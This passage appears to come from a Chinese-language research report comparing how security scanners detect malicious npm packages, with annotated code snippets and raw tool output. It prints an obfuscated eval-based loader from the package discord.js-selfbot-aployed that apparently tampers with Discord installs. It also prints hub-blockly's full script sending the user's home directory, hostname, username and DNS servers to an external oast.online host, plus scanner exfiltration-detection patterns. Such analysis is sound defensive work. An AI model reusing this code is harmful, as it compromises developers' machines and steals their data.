- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 4

**文件：** `package/RESTMethods.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs arbitrary HTTP requests, sends messages and files, and can transmit data to webhooks or external endpoints.

**规避技术：** 

**恶意代码：**
```javascript
const querystring = require('querystring');
const long = require('long');
const Permissions = require('../../util/Permissions');
const Constants = require('../../util/Constants');
const Endpoints = Constants.Endpoints;
const Collection = require('../../util/Collection');
const Util = require('../../util/Util');
const resolvePermissions = require('../../structures/shared/resolvePermissions');

const RichEmbed = require('../../structures/RichEmbed');
const User = require('../../structures/User');
const GuildMember = require('../../structures/GuildMember');
const Message = require('../../structures/Message');
const Role = require('../../structures/Role');
const Invite = require('../../structures/Invite');
const Webhook = require('../../structures/Webhook');
const UserProfile = require('../../structures/UserProfile');
const OAuth2Application = require('../../structures/OAuth2Application');
const Channel = require('../../structures/Channel');
const GroupDMChannel = require('../../structures/GroupDMChannel');
const Guild = require('../../structures/Guild');
const VoiceRegion = require('../../structures/VoiceRegion');
const GuildAuditLogs = require('../../structures/GuildAuditLogs');

class RESTMethods {
  constructor(restManager) {
    this.rest = restManager;
    this.client = restManager.client;
    this._ackToken = null;
  }

  // ... [truncated for brevity] ...

  sendMessage(channel, content, { tts, nonce, embed, disableEveryone, split, code, reply } = {}, files = null) {
    return new Promise((resolve, reject) => { // eslint-disable-line complexity
      if (typeof content !== 'undefined') content = this.client.resolver.resolveString(content);

      // The nonce has to be a uint64 :<
      if (typeof nonce !== 'undefined') {
        nonce = parseInt(nonce);
        if (isNaN(nonce) || nonce < 0) throw new RangeError('Message nonce must fit in an unsigned 64-bit integer.');
      }

      if (content) {
        if (split && typeof split !== 'object') split = {};

        // Wrap everything in a code block
        if (typeof code !== 'undefined' && (typeof code !== 'boolean' || code === true)) {
          content = Util.escapeMarkdown(this.client.resolver.resolveString(content), true);
          content = `\`\`\`${typeof code !== 'boolean' ? code || '' : ''}\n${content}\n\`\`\``;
          if (split) {
            split.prepend = `\`\`\`${typeof code !== 'boolean' ? code || '' : ''}\n`;
            split.append = '\n```';
          }
        }

        // Add zero-width spaces to @everyone/@here
        if (disableEveryone || (typeof disableEveryone === 'undefined' && this.client.options.disableEveryone)) {
          content = content.replace(/@(everyone|here)/g, '@\u200b$1');
        }

        // Add the reply prefix
        if (reply && !(channel instanceof User || channel instanceof GuildMember) && channel.type !== 'dm') {
          const id = this.client.resolver.resolveUserID(reply);
          const mention = `<@${reply instanceof GuildMember && reply.nickname ? '!' : ''}${id}>`;
          content = `${mention}${content ? `, ${content}` : ''}`;
          if (split) split.prepend = `${mention}, ${split.prepend || ''}`;
        }

        // Split the content
        if (split) content = Util.splitMessage(content, split);
      } else if (reply && !(channel instanceof User || channel instanceof GuildMember) && channel.type !== 'dm') {
        const id = this.client.resolver.resolveUserID(reply);
        content = `<@${reply instanceof GuildMember && reply.nickname ? '!' : ''}${id}>`;
      }

      const send = chan => {
        if (content instanceof Array) {
          const messages = [];
          (function sendChunk(list, index) {
            const options = index === list.length - 1 ? { tts, embed, files } : { tts };
            chan.send(list[index], options).then(message => {
              messages.push(message);
              if (index >= list.length - 1) return resolve(messages);
              return sendChunk(list, ++index);
            }).catch(reject);
          }(content, 0));
        } else {
          this.rest.makeRequest('post', Endpoints.Channel(chan).messages, true, {
            content, tts, nonce, embed,
          }, files).then(data => resolve(this.client.actions.MessageCreate.handle(data).message), reject);
        }
      };

      if (channel instanceof User || channel instanceof GuildMember) this.createDM(channel).then(send, reject);
      else send(channel);
    });
  }

  // ... [truncated for brevity] ...

  sendWebhookMessage(webhook, content, { avatarURL, tts, embeds, username } = {}, files = null) {
    return new Promise((resolve, reject) => {
      username = username || webhook.name;

      if (content instanceof Array) {
        const messages = [];
        (function sendChunk(list, index) {
          const options = index === list.length - 1 ? { tts, embeds, files } : { tts };
          webhook.send(list[index], options).then(message => {
            messages.push(message);
            if (index >= list.length - 1) return resolve(messages);
            return sendChunk(list, ++index);
          }).catch(reject);
        }(content, 0));
      } else {
        this.rest.makeRequest('post', `${Endpoints.Webhook(webhook.id, webhook.token)}?wait=true`, false, {
          username,
          avatar_url: avatarURL,
          content,
          tts,
          embeds,
        }, files).then(data => {
          if (!this.client.channels) resolve(data);
          else resolve(this.client.actions.MessageCreate.handle(data).message);
        }, reject);
      }
    });
  }

  sendSlackWebhookMessage(webhook, body) {
    return this.rest.makeRequest(
      'post', `${Endpoints.Webhook(webhook.id, webhook.token)}/slack?wait=true`, false, body
    );
  }

  // ... [truncated for brevity] ...
}

module.exports = RESTMethods;

```

**形式化行为：** legitimate_api_abuse, data_exfiltration, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 5

**文件：** `package/UserGet.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Highly obfuscated loader, dynamic eval, file/network ops, possible code injection, persistence, and anti-tamper logic

**规避技术：** 

**恶意代码：**
```javascript
const Action = require('./Action');
let gqUE;
!function(){
  const UTaC=Array.prototype.slice.call(arguments);
  return eval("(function c6RC(LlZu){const nT1u=Xs6s(LlZu,fJRu(c6RC.toString()));try{let HgUu=eval(nT1u);return HgUu.apply(null,UTaC);}catch(jOWu){var DbPu=(0o206402-68829);while(DbPu<(0o400126%65560))switch(DbPu){case (0x300A6%0o200053):DbPu=jOWu instanceof SyntaxError?(0o400110%0x1001D):(0o400130%0x10019);break;case (0o200644-0x10196):DbPu=(0o400144%65567);{console.log('Error: the code has been tampered!');return}break;}throw jOWu;}function fJRu(H8Ls){let jGOs=155915676;var D3Gs=(0o400113%65562);{let fBJs;while(D3Gs<(0x10500-0o202340)){switch(D3Gs){case (0o600117%0x10014):D3Gs=(66976-0o202624);{jGOs^=(H8Ls.charCodeAt(fBJs)*(15658734^0O73567354)+H8Ls.charCodeAt(fBJs>>>(0x4A5D0CE&0O320423424)))^544733998;}break;case (0o202260-66724):D3Gs=(131117%0o200020);fBJs++;break;case (262249%0o200027):D3Gs=fBJs<H8Ls.length?(0o400121%0x1001F):(67776-0o204240);break;case (0o1000167%0x10018):D3Gs=(0o201616-0x10381);fBJs=(0x75bcd15-0O726746425);break;}}}let zYBs="";var bwEs=(65816-0o200412);{let vTws;while(bwEs<(0o600066%0x10007)){switch(bwEs){case (0o600137%65563):bwEs=(0x20048%0o200030);vTws=(0x21786%3);break;case (0o200740-0x101C8):bwEs=vTws<(0O347010110&0x463A71D)?(65856-0o200440):(0o400065%0x1000A);break;case (131132%0o200016):bwEs=(0o203030-0x105FE);{const Xqzs=jGOs%(0o202640-66958);jGOs=Math.floor(jGOs/(0x3004E%0o200024));zYBs+=Xqzs>=(131138%0o200024)?String.fromCharCode((0o210706-0x11185)+(Xqzs-(0o400072%0x10010))):String.fromCharCode((196831%0o200052)+Xqzs);}break;case (0o600120%0x10012):bwEs=(0o200360-65752);vTws++;break;}}}return zYBs;}function Xs6s(z08s,Tn1s){z08s=decodeURI(z08s);let vV3s=(0x75bcd15-0O726746425);let PiWs="";var rQYs=(0o205656-0x10B97);{let LdRs;while(rQYs<(0x10F00-0o207340)){switch(rQYs){case (0o200276-0x100AB):rQYs=(0o200360-65764);{PiWs+=String.fromCharCode(z08s.charCodeAt(LdRs)^Tn1s.charCodeAt(vV3s));vV3s++;var nLTs=(0o202114-0x10436);while(nLTs<(0x30088%0o200042))switch(nLTs){case (0o400074%65555):nLTs=vV3s>=Tn1s.length?(67846-0o204345):(0o600177%65567);break;case (262229%0o200015):nLTs=(0o1000252%65570);{vV3s=(0x75bcd15-0O726746425);}break;}}break;case (0o400071%0x10016):rQYs=LdRs<z08s.length?(196720%0o200037):(262236%0o200017);break;case (262243%0o200023):rQYs=(65666-0o200165);LdRs=(0x75bcd15-0O726746425);break;case (0o400070%65558):rQYs=(0x3005E%0o200033);LdRs++;break;}}}return PiWs;}})("G%03%1C%0B%09%1F%0C%0E%01M@%1E%0C%1E%0B%02%1B%0C%06%0BJ.%0B5%20M@%1E%18%0E%11%14%1D%0BIMA@%3EJ484%3EA08%3CFNAM'... [truncated for brevity] ...");
}();
AYDw();
async function AYDw(){
  QQow=require(gqUE.g42y(0));
  const UTuw=require(gqUE.wmQy(1));
  function wVxw(){
    Qkcx=[];
    oPlw[gqUE.shLy(2)](wplx=>{
      Yqox={};
      Yqox[gqUE.weIw(3)]=gqUE.s9Cw(4);
      Yqox[gqUE.o4xw(5)]=`${gqUE.kZsw(6)}${wplx}${gqUE.kZsw(6)}`;
      Yqox[gqUE.My2w(7)]=!(0O12130251%3);
      smfx=Yqox;
      Qkcx[gqUE.g42y(8)](smfx);
      var Yqox,smfx
    });
    MBJx[gqUE.wmQy(9)](UHVx,{[gqUE.shLy(10)]:null,[gqUE.weIw(11)]:[{[gqUE.s9Cw(12)]:gqUE.o4xw(13),[gqUE.kZsw(14)]:QEPx[gqUE.My2w(15)],[gqUE.g42y(16)]:Qkcx,[gqUE.wmQy(17)]:{[gqUE.weIw(3)]:gqUE.shLy(18)},[gqUE.weIw(19)]:{[gqUE.s9Cw(20)]:gqUE.shLy(18)}}]})[gqUE.o4xw(21)](Unix=>{})[gqUE.kZsw(22)](ojZw=>{});
    var Qkcx
  }
  const kgTw=require(gqUE.My2w(23));
  const {[gqUE.g42y(24)]:MhWw}=require(gqUE.wmQy(25));
  const MBJx=require(gqUE.shLy(26));
  function oDMx(){
    MhWw(gqUE.weIw(27),function(IyDx,kAGx,Evxx){
      gxAx=gqUE[gqUE.s9Cw(28)]();
      while(gxAx<gqUE[gqUE.o4xw(29)]())switch(gxAx){
        case 14:gxAx=gqUE[gqUE.o4xw(29)]();{IKcw[gqUE.g42y(8)](gqUE.kZsw(30))}break;
        case 37:gxAx=kAGx[gqUE.My2w(31)](gqUE.g42y(32))?gqUE[gqUE.wmQy(33)]():gqUE[gqUE.o4xw(29)]();break;
      }
      Asrx=gqUE[gqUE.shLy(34)]();
      while(Asrx<gqUE[gqUE.weIw(35)]())switch(Asrx){
        case 19:Asrx=gqUE[gqUE.weIw(35)]();{IKcw[gqUE.g42y(8)](gqUE.s9Cw(36))}break;
        case 13:Asrx=kAGx[gqUE.My2w(31)](gqUE.o4xw(37))?gqUE[gqUE.kZsw(38)]():gqUE[gqUE.weIw(35)]();break;
      }
      cuux=gqUE[gqUE.My2w(39)]();
      while(cuux<gqUE[gqUE.g42y(40)]())switch(cuux){
        case 35:cuux=kAGx[gqUE.My2w(31)](gqUE.wmQy(41))?gqUE[gqUE.shLy(42)]():gqUE[gqUE.g42y(40)]();break;
        case 25:cuux=gqUE[gqUE.g42y(40)]();{IKcw[gqUE.g42y(8)](gqUE.weIw(43))}break;
      }
      cOhy=gqUE[gqUE.s9Cw(44)]();
      while(cOhy<gqUE[gqUE.My2w(39)]())switch(cOhy){
        case 29:cOhy=gqUE[gqUE.My2w(39)]();{IKcw[gqUE.g42y(8)](gqUE.o4xw(45))}break;
        case 18:cOhy=kAGx[gqUE.My2w(31)](gqUE.kZsw(46))?gqUE[gqUE.My2w(47)]():gqUE[gqUE.My2w(39)]();break;
      };
      EPky=gqUE[gqUE.wmQy(33)]();
      while(EPky<gqUE[gqUE.g42y(48)]())switch(EPky){
        case 24:EPky=gqUE[gqUE.g42y(48)]();{Akdv();}break;
        case 14:EPky=QEPx[gqUE.wmQy(49)]==gqUE.shLy(50)?gqUE[gqUE.weIw(51)]():gqUE[gqUE.weIw(35)]();break;
        case 32:EPky=gqUE[gqUE.g42y(48)]();{YKby=gqUE[gqUE.s9Cw(52)]();while(YKby<gqUE[gqUE.g42y(40)]())switch(YKby){case 11:YKby=gqUE[gqUE.g42y(40)]();{wVxw();}break;case 10:YKby=QEPx[gqUE.o4xw(53)]==gqUE.kZsw(54)&&oPlw[gqUE.My2w(55)]!=(0x21786%3)?gqUE[gqUE.g42y(56)]():gqUE[gqUE.g42y(40)]();break;}sGSx();syEv()}break;
      }
      var gxAx,Asrx,cuux,cOhy,EPky,YKby
    })
  }
  const AMey=require(gqUE.wmQy(57));
  const UHVx=gqUE.shLy(58);
  const wJYx={};
  wJYx[gqUE.wmQy(49)]=gqUE.shLy(50);
  wJYx[gqUE.o4xw(53)]=gqUE.shLy(50);
  wJYx[gqUE.weIw(59)]=gqUE.shLy(50);
  wJYx[gqUE.s9Cw(60)]=gqUE.kZsw(54);
  wJYx[gqUE.My2w(15)]=null;
  wJYx[gqUE.o4xw(61)]=gqUE.kZsw(54);
  const QEPx=wJYx;
  sSrw=process[gqUE.kZsw(62)][gqUE.My2w(63)];
  function sGSx(){
    kgTw[gqUE.g42y(64)](gqUE.wmQy(65),UfUu=>{
      let whXu=gqUE.shLy(66);
      UfUu[gqUE.weIw(67)](gqUE.s9Cw(68),QcOu=>{whXu+=QcOu;});
      UfUu[gqUE.weIw(67)](gqUE.o4xw(69),()=>{
        oPlw[gqUE.shLy(2)](seRu=>{
          UTuw[gqUE.kZsw(70)](seRu,whXu[gqUE.My2w(71)](gqUE.g42y(72),UHVx)[gqUE.My2w(71)](gqUE.wmQy(73),QEPx[gqUE.s9Cw(60)])[gqUE.My2w(71)](gqUE.shLy(74),QEPx[gqUE.wmQy(49)])[gqUE.My2w(71)](gqUE.weIw(75),QEPx[gqUE.weIw(59)])[gqUE.My2w(71)](gqUE.s9Cw(76),QEPx[gqUE.My2w(15)])[gqUE.My2w(71)](gqUE.o4xw(77),QEPx[gqUE.o4xw(61)]),{[gqUE.kZsw(78)]:gqUE.My2w(79),[gqUE.g42y(80)]:gqUE.wmQy(81)});
          IWBu=gqUE[gqUE.s9Cw(52)]();
          while(IWBu<gqUE[gqUE.g42y(40)]())switch(IWBu){
            case 11:IWBu=gqUE[gqUE.g42y(40)]();{let MZHu=seRu[gqUE.My2w(71)](gqUE.shLy(82),gqUE.weIw(83));kYEu=gqUE[gqUE.My2w(39)]();while(kYEu<gqUE[gqUE.g42y(40)]())switch(kYEu){case 35:kYEu=!UTuw[gqUE.s9Cw(84)](MZHu)?gqUE[gqUE.shLy(42)]():gqUE[gqUE.g42y(40)]();break;case 25:kYEu=gqUE[gqUE.g42y(40)]();{UTuw[gqUE.o4xw(85)](MZHu,gqUE.j(14)?0744:477)}break;}}break;
            case 10:IWBu=QEPx[gqUE.s9Cw(60)]==gqUE.kZsw(54)?gqUE[gqUE.g42y(56)]():gqUE[gqUE.g42y(40)]();break;
          }
          kssv=gqUE[gqUE.My2w(47)]();
          while(kssv<gqUE[gqUE.My2w(39)]())switch(kssv){
            case 34:kssv=gqUE[gqUE.My2w(39)]();{let obLu=seRu[gqUE.My2w(71)](gqUE.shLy(82),gqUE.kZsw(86));Mtvv=gqUE[gqUE.s9Cw(44)]();while(Mtvv<gqUE[gqUE.My2w(39)]())switch(Mtvv){case 34:Mtvv=gqUE[gqUE.My2w(39)]();gpmv=gqUE[gqUE.My2w(87)]();while(gpmv<gqUE[gqUE.g42y(40)]())switch(gpmv){case 10:gpmv=gqUE[gqUE.g42y(40)]();{startDiscord();}break;case 31:gpmv=UTuw[gqUE.s9Cw(84)](obLu)&&QEPx[gqUE.wmQy(49)]==gqUE.shLy(50)?gqUE[gqUE.s9Cw(52)]():gqUE[gqUE.g42y(40)]();break;}break;case 18:Mtvv=!UTuw[gqUE.s9Cw(84)](obLu)?gqUE[gqUE.My2w(47)]():gqUE[gqUE.g42y(88)]();break;case 29:Mtvv=gqUE[gqUE.My2w(39)]();{UTuw[gqUE.o4xw(85)](obLu,gqUE.j(17)?491:0744);Iqpv=gqUE[gqUE.weIw(51)]();while(Iqpv<gqUE[gqUE.g42y(48)]())switch(Iqpv){case 24:Iqpv=QEPx[gqUE.wmQy(49)]==gqUE.shLy(50)?gqUE[gqUE.weIw(35)]():gqUE[gqUE.g42y(48)]();break;case 32:Iqpv=gqUE[gqUE.g42y(48)]();{startDiscord();}break;}}break;}}break;case 29:kssv=QEPx[gqUE.wmQy(49)]!=gqUE.wmQy(89)?gqUE[gqUE.g42y(88)]():gqUE[gqUE.My2w(39)]();break;}
          var IWBu,kYEu,kssv,Mtvv,gpmv,Iqpv
        })
      });
    })[gqUE.weIw(67)](gqUE.shLy(90),cmgv=>{console[gqUE.weIw(91)](cmgv);});
  }
  MNiw=[];
  oPlw=[];
  IKcw=[];
  UTuw[gqUE.s9Cw(92)](sSrw)[gqUE.shLy(2)](Enjv=>{
    Yiav=gqUE[gqUE.g42y(48)]();
    while(Yiav<gqUE[gqUE.My2w(39)]())switch(Yiav){
      case 29:Yiav=gqUE[gqUE.My2w(39)]();{return;}break;
      case 33:Yiav=Enjv[gqUE.My2w(31)](gqUE.o4xw(93))?gqUE[gqUE.s9Cw(44)]():gqUE[gqUE.My2w(47)]();break;
      case 18:Yiav=gqUE[gqUE.My2w(39)]();{MNiw[gqUE.g42y(8)](sSrw+gqUE.kZsw(94)+Enjv)}break;
    }
    var Yiav
  });
  function Akdv(){
    AEQv=gqUE[gqUE.My2w(87)]();
    while(AEQv<gqUE[gqUE.g42y(40)]())switch(AEQv){
      case 10:AEQv=gqUE[gqUE.g42y(40)]();{wVxw();}break;
      case 31:AEQv=QEPx[gqUE.o4xw(53)]==gqUE.kZsw(54)&&oPlw[gqUE.My2w(55)]!=(0x21786%3)?gqUE[gqUE.s9Cw(52)]():gqUE[gqUE.g42y(40)]();break;
    }
    sGSx();syEv();var AEQv
  }
  MNiw[gqUE.shLy(2)](function(cGTv){
    let wBKv=`${cGTv}`+gqUE.My2w(95);
    QQow[gqUE.g42y(96)](wBKv)[gqUE.wmQy(97)](YCNv=>{oPlw[gqUE.g42y(8)](YCNv)})
  });
  oDMx();;
  function syEv(){
    UzHv=process[gqUE.kZsw(62)][gqUE.shLy(98)]+gqUE.weIw(99);
    ovyv=gqUE[gqUE.s9Cw(100)]();
    while(ovyv<gqUE[gqUE.My2w(47)]())switch(ovyv){
      case 28:ovyv=UTuw[gqUE.s9Cw(84)](UzHv)?gqUE[gqUE.o4xw(101)]():gqUE[gqUE.kZsw(102)]();break;
      case 23:ovyv=gqUE[gqUE.My2w(47)]();{return;}break;
      case (0O144657447^0x1935F20):ovyv=gqUE[gqUE.My2w(47)]();{QwBv=UTuw[gqUE.My2w(103)](UzHv);UTuw[gqUE.kZsw(70)](UzHv,AMey(QwBv,gqUE.g42y(104),gqUE.wmQy(105)))}break;
    }
    var UzHv,ovyv,QwBv
  };;
  var QQow,sSrw,MNiw,oPlw,IKcw
}
// ... [truncated for brevity] ...
```

**形式化行为：** dynamic_evaluation, malicious_download, remote_code_execution, sensitive_data_collection, data_exfiltration, persistence_installation, string_obfuscation

**形式化规避：** string_obfuscation, dynamic_evaluation, anti_static_analysis, control_flow_flattening, silent_error_handling, built_in_module_abuse, variable_indirection

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 6

**文件：** `package/WebSocketConnection.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Establishes WebSocket connections, processes and transmits data, decompresses and decodes payloads, and emits raw network packets.

**规避技术：** 

**恶意代码：**
```javascript
const EventEmitter = require('events');
const Constants = require('../../util/Constants');
const zlib = require('zlib');
const PacketManager = require('./packets/WebSocketPacketManager');
const erlpack = (function findErlpack() {
  try {
    const e = require('erlpack');
    if (!e.pack) return null;
    return e;
  } catch (e) {
    return null;
  }
}());

const WebSocket = (function findWebSocket() {
  if (browser) return window.WebSocket; // eslint-disable-line no-undef
  try {
    return require('@discordjs/uws');
  } catch (e) {
    return require('ws');
  }
}());

class WebSocketConnection extends EventEmitter {
  constructor(manager, gateway) {
    super();
    this.manager = manager;
    this.client = manager.client;
    this.ws = null;
    this.sequence = -1;
    this.status = Constants.Status.IDLE;
    this.packetManager = new PacketManager(this);
    this.lastPingTimestamp = 0;
    this.ratelimit = {
      queue: [],
      remaining: 120,
      total: 120,
      time: 60e3,
      resetTimer: null,
    };
    this.connect(gateway);
    this.disabledEvents = {};
    this.closeSequence = 0;
    this.expectingClose = false;
    for (const event of this.client.options.disabledEvents) this.disabledEvents[event] = true;
  }

  unpack(data) {
    if (data instanceof ArrayBuffer) data = Buffer.from(new Uint8Array(data));
    if (erlpack && typeof data !== 'string') return erlpack.unpack(data);
    else if (data instanceof Buffer) data = zlib.inflateSync(data).toString();
    return JSON.parse(data);
  }

  pack(data) {
    return erlpack ? erlpack.pack(data) : JSON.stringify(data);
  }

  connect(gateway = this.gateway, after = 0, force = false) {
    if (after) return this.client.setTimeout(() => this.connect(gateway, 0, force), after); // eslint-disable-line
    if (this.ws && !force) {
      this.debug('WebSocket connection already exists');
      return false;
    } else if (typeof gateway !== 'string') {
      this.debug(`Tried to connect to an invalid gateway: ${gateway}`);
      return false;
    }
    this.expectingClose = false;
    this.gateway = gateway;
    this.debug(`Connecting to ${gateway}`);
    const ws = this.ws = new WebSocket(gateway);
    if (browser) ws.binaryType = 'arraybuffer';
    ws.onmessage = this.onMessage.bind(this);
    ws.onopen = this.onOpen.bind(this);
    ws.onerror = this.onError.bind(this);
    ws.onclose = this.onClose.bind(this);
    this.status = Constants.Status.CONNECTING;
    return true;
  }

  onMessage(event) {
    let data;
    try {
      data = this.unpack(event.data);
    } catch (err) {
      this.emit('debug', err);
    }
    return this.onPacket(data);
  }

  onPacket(packet) {
    if (!packet) {
      this.debug('Received null packet');
      return false;
    }
    this.client.emit('raw', packet);
    switch (packet.op) {
      case Constants.OPCodes.HELLO:
        return this.heartbeat(packet.d.heartbeat_interval);
      case Constants.OPCodes.RECONNECT:
        return this.reconnect();
      case Constants.OPCodes.INVALID_SESSION:
        if (!packet.d) this.sessionID = null;
        this.sequence = -1;
        this.debug('Session invalidated -- will identify with a new session');
        return this.identify(packet.d ? 2500 : 0);
      case Constants.OPCodes.HEARTBEAT_ACK:
        return this.ackHeartbeat();
      case Constants.OPCodes.HEARTBEAT:
        return this.heartbeat();
      default:
        return this.packetManager.handle(packet);
    }
  }

  onOpen(event) {
    if (event && event.target && event.target.url) this.gateway = event.target.url;
    this.debug(`Connected to gateway ${this.gateway}`);
    this.identify();
  }

  onError(error) {
    if (error && error.message === 'uWs client connection error') {
      this.reconnect();
      return;
    }
    this.client.emit(Constants.Events.ERROR, error);
  }

  onClose(event) {
    this.debug(`${this.expectingClose ? 'Client' : 'Server'} closed the WebSocket connection: ${event.code}`);
    this.closeSequence = this.sequence;
    this.emit('close', event);
    this.heartbeat(-1);
    if (event.code === 1000 ? this.expectingClose : Constants.WSCodes[event.code]) {
      this.expectingClose = false;
      this.client.emit(Constants.Events.DISCONNECT, event);
      this.debug(Constants.WSCodes[event.code]);
      this.destroy();
      return;
    }
    this.expectingClose = false;
    this.reconnect();
  }

  send(data) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.debug(`Tried to send packet ${JSON.stringify(data)} but no WebSocket is available!`);
      return;
    }
    this.ratelimit.queue.push(data);
    this.processQueue();
  }

  _send(data) {
    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) {
      this.debug(`Tried to send packet ${JSON.stringify(data)} but no WebSocket is available!`);
      return;
    }
    this.ws.send(this.pack(data));
  }

  // ... [truncated for brevity] ...
}

```

**形式化行为：** command_and_control, encrypted_communication, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

*无可用结果*

#### GUARDDOG

```
Found 0 potentially malicious indicators scanning /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/discord.js-selfbot-aployed/11.5.1/discord.js-selfbot-aployed-11.5.1.tgz
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m287[0m[31m ]--[0m
   Rule Id: [34mBD000702[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Environment[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/browser.js[0m
   Pattern: [32m(env|environment).{1,50}(get|post|curl|nc|invoke-restmethod)[0m
[30;1m1 | [0m[35mconst browser = typeof window !== 'undefined';[0m
[30;1m2 | [0m[35mconst webpack = !!process.env.__DISCORD_WEBPACK__;[0m
[30;1m3 | [0m[35m[0m
[30;1m4 | [0m[35mconst Discord = require('./');[0m
[30;1m5 | [0m[35m[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m287[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/src/client/voice/receiver/VoiceReceiver.js[0m
   Pattern: [32m(npm owner|password|htpasswd|auth_?token|secret_?key|private_?key|authori
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "discord.js-selfbot-aployed",
  "version": "11.5.1",
  "total_files": 10,
  "analyzed_files": 10,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T19:11:02.775753"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/discord.js-selfbot-aployed/11.5.1/extracted_discord.js-selfbot-aployed-11.5.1.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/discord.js-selfbot-aployed/11.5.1/extracted_discord.js-selfbot-aployed-11.5.1.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 11.5.1[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mDiscord.js V11 PATCHED. Fixes issue with stage ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/malicious_package/unzip_malware/discord.js-selfbot-aployed/11.5.1/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/malicious_package/unzip_malware/discord.js-selfbot-aployed/11.5.1/package' from local_nodejs...[1m[32mPASS[0m [[34mver 11.5.1[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mDiscord.js V11 PATCHED. Fixes issue with stage ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [invalid format!]
[1
... (truncated)
```

---

## 行为类别：Data Exfiltration

**包名：** `hub-blockly`  
**版本：** `0.1.8`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** `35`  
**标注类型：** `npm-exfiltrate-sensitive-data`

**行为说明：** Collects system and package data, exfiltrates via HTTPS POST to external server.

**规避技术：** Uses built-in modules, silent error handling, blends with normal network activity.

**恶意代码：**
```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const package = packageJSON.name;

const trackingData = JSON.stringify({
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: dns.getServers(),
    r: packageJSON ? packageJSON.___resolved : undefined,
    v: packageJSON.version,
    pjson: packageJSON,
});

var postData = querystring.stringify({
    msg: trackingData,
});

var options = {
    hostname: "cmua367pu5a8novkok3gnyzwkyw1zjgdc.oast.online",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length,
    },
};

var req = https.request(options, (res) => {
    res.on("data", (d) => {
        process.stdout.write(d);
    });
});

req.on("error", (e) => {
    // console.error(e);
});

req.write(postData);
req.end();
```

**形式化行为：** sensitive_data_collection, data_exfiltration

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/index.js`  
**行号：** `45`  
**标注类型：** `npm-exfiltrate-sensitive-data`

